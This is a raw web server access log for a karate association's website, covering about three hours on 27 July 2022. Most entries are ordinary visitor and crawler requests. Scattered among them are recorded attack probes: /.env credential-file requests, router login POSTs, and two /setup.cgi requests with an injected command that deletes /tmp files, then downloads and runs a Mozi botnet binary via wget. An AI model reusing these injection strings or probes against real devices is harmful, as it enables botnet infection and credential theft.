::ffff:73.202.170.82 - - [27/Jul/2022:00:00:11 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:114.119.151.93 - - [27/Jul/2022:00:02:39 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:185.254.196.115 - - [27/Jul/2022:00:03:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [27/Jul/2022:00:03:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:98.234.224.71 - - [27/Jul/2022:00:04:33 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:207.46.13.117 - - [27/Jul/2022:00:06:35 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.151.9 - - [27/Jul/2022:00:10:54 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:207.46.13.182 - - [27/Jul/2022:00:13:13 +0000] "GET /images/instructors/arce.jpg HTTP/1.1" 200 14433 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:163.123.143.71 - - [27/Jul/2022:00:26:16 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:157.55.39.96 - - [27/Jul/2022:00:30:48 +0000] "GET /images/instructors/mlee.jpg HTTP/1.1" 200 65525 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.202.170.82 - - [27/Jul/2022:00:35:58 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:40.77.167.41 - - [27/Jul/2022:00:48:21 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.54 - - [27/Jul/2022:00:48:33 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.202.170.82 - - [27/Jul/2022:00:48:38 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:114.119.152.128 - - [27/Jul/2022:01:07:40 +0000] "GET /books.php HTTP/1.1" 404 148 "http://www.wadokikai.org/overview.html" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:51.222.253.5 - - [27/Jul/2022:01:14:57 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [27/Jul/2022:01:14:58 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:114.119.135.172 - - [27/Jul/2022:01:19:41 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:82.78.134.21 - - [27/Jul/2022:01:24:04 +0000] "GET /contact.html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.9) Gecko/20100101 Goanna/3.4 Firefox/52.9 PaleMoon/27.8.3"
::ffff:112.94.98.212 - - [27/Jul/2022:01:27:04 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:135.125.246.189 - - [27/Jul/2022:01:31:04 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [27/Jul/2022:01:31:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:98.234.224.71 - - [27/Jul/2022:01:32:42 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:185.254.196.115 - - [27/Jul/2022:01:33:06 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [27/Jul/2022:01:33:06 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:40.77.167.66 - - [27/Jul/2022:01:34:41 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:40.88.21.235 - - [27/Jul/2022:01:45:13 +0000] "GET / HTTP/1.1" 200 57618 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:40.88.21.235 - - [27/Jul/2022:01:45:13 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:25 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:25 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:26 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:27 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:30 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:33 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:37 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:44 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /resources HTTP/1.1" 200 194907 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 200 13951 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/tm.jpg HTTP/1.1" 200 25020 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/MBS.gif HTTP/1.1" 200 13195 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 200 7644 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 200 3760 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 200 2677 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/bookoffiverings.jpg HTTP/1.1" 200 2940 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 200 4046 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 200 3631 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 200 2813 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 200 3043 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/bobook.gif HTTP/1.1" 200 6919 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 200 1934 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 200 3442 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 200 12021 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 200 3578 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 200 3457 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 200 4025 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 200 22573 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:52 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:53 +0000] "GET /images/favicon.ico HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:47:56 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:48:17 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:48:45 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:100.15.13.59 - - [27/Jul/2022:01:49:19 +0000] "GET /images/favicon.ico HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:117.90.209.118 - - [27/Jul/2022:01:52:16 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:66.249.79.187 - - [27/Jul/2022:01:54:18 +0000] "GET /videos.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:180.149.125.167 - - [27/Jul/2022:02:09:58 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 404 182 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:136.24.141.37 - - [27/Jul/2022:02:16:47 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:16:59 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:17:11 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:17:23 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:17:35 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:17:47 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:17:59 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:18:11 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:18:23 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:18:35 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:18:47 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:136.24.141.37 - - [27/Jul/2022:02:18:59 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1"
::ffff:197.245.61.86 - - [27/Jul/2022:02:19:02 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:104.248.91.177 - - [27/Jul/2022:02:25:19 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:104.248.91.177 - - [27/Jul/2022:02:25:19 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.233.62.116 - - [27/Jul/2022:02:33:56 +0000] "GET / HTTP/1.1" 200 57618 "-" "python-requests/2.28.1"
::ffff:192.241.219.55 - - [27/Jul/2022:02:46:15 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.90.209.76 - - [27/Jul/2022:02:46:52 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:157.90.209.76 - - [27/Jul/2022:02:46:55 +0000] "GET /sitemap HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:157.90.209.76 - - [27/Jul/2022:02:47:08 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
